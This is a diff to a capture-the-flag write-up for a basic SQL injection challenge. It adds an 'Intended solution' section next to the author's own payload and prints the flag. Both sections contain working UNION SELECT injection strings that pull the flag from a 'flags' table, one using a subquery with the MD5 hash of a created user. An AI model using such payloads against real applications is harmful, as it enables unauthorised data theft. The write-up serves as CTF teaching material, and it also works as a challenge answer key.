@@ -156,3 +156,14 @@ Success!
 **Flag:** L3ak{__V3RY_B4S1C_SQLI}
 
 > _**PS:**_ After the CTF I realized that we don't actually need a comment, as the content of `LIKE` already contains a string. So this would also work: `" UNION SELECT users.username, flags.flag, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --`
+
+## Intended solution
+
+Interestingly enough, my solution was pretty close to the intended one, which as posted by *xhalyl* is to
+```
+"UNION SELECT username,(select flag from flags),"{hashed_password}" from users where username like "%{hashed_password}%";--
+```
+Where `{hashed_password}` is the md5 of the user you create.
+*We know the app uses md5 because of the [utils.py](./bbsqli/utils.py) file.*
+It avoids the usage of JOIN and directly selects the flag.
+The intended solve script is [attached](./intended_solve.py).
